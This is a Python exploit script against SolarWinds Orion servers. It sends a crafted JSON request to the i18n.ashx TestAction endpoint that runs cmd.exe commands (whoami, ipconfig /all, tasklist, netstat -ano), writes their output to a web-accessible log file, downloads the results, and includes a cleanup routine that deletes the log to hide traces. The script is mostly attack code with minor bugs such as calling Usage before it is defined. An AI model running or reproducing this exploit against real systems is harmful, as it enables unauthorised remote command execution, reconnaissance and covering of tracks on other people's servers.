import requests
import sys

target = sys.argv[1]

if sys.argv[0] == "-h":
    Usage()
    exit()

def Usage():
    print("python SolarWinds.py http://xxxx.com [command]")

command = ['whoami','ipconfig /all',"tasklist","netstat -ano"]

url = "{}/api/Action/TestAction/i18n.ashx".format(target)

headers = {"Connection": "keep-alive", "Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7", "Content-Type": "application/json"}

post_json={"ActionContext": {"$type": "SolarWinds.Orion.Core.Models.Actions.Contexts.AlertingActionContext, SolarWinds.Orion.Actions.Models", "EntityType": "Orion.Nodes", "EntityUri": "swis://POC/Orion/Orion.Nodes/NodeID=1"}, "ActionDefinition": {"$type": "SolarWinds.Orion.Core.Models.Actions.ActionDefinition, SolarWinds.Orion.Actions.Models", "ActionProperties": [{"$type": "SolarWinds.Orion.Core.Models.Actions.ActionProperty, SolarWinds.Orion.Actions.Models", "IsShared": False, "PropertyName": "EscalationLevel", "PropertyValue": "0"}, {"$type": "SolarWinds.Orion.Core.Models.Actions.ActionProperty, SolarWinds.Orion.Actions.Models", "IsShared": False, "PropertyName": "executionIfAknowledge", "PropertyValue": "True"}, {"$type": "SolarWinds.Orion.Core.Models.Actions.ActionProperty, SolarWinds.Orion.Actions.Models", "IsShared": False, "PropertyName": "executionRepeatTimeSpan", "PropertyValue": "0"}, {"$type": "SolarWinds.Orion.Core.Models.Actions.ActionProperty, SolarWinds.Orion.Actions.Models", "IsShared": False, "PropertyName": "FilePath", "PropertyValue": "/c [cmd] > C:\\inetpub\\SolarWinds\\log.txt"}, {"$type": "SolarWinds.Orion.Core.Models.Actions.ActionProperty, SolarWinds.Orion.Actions.Models", "IsShared": False, "PropertyName": "Credentials", "PropertyValue": ""}, {"IsShared": False, "PropertyName": "Interpreter", "PropertyValue": "cmd.exe"}], "ActionTypeID": "ExecuteVBScript"}, "EnvironmentType": "Alerting"}

for cmd in command:
    tempjson = eval(str(post_json).replace("[cmd]",cmd))
    r = requests.post(url, headers=headers, json=tempjson,verify = False)
    
    if "ErrorMessage" in r.text:
        print("The target is vuln,current command is {}".format(cmd))
        #get the command result
        res = requests.get(target+"/log.txt")
        saveFileDir = (cmd+".txt").replace(" ","_").replace("/","")
        saveFile = open(saveFileDir,'a')
        saveFile.write(res.text)
        saveFile.close()

def clearfile():
    filelist = ["log.txt"]
    tempjson = eval(str(post_json).replace("[cmd] >","del"))
    r = requests.post(url, headers=headers, json=tempjson,verify = False)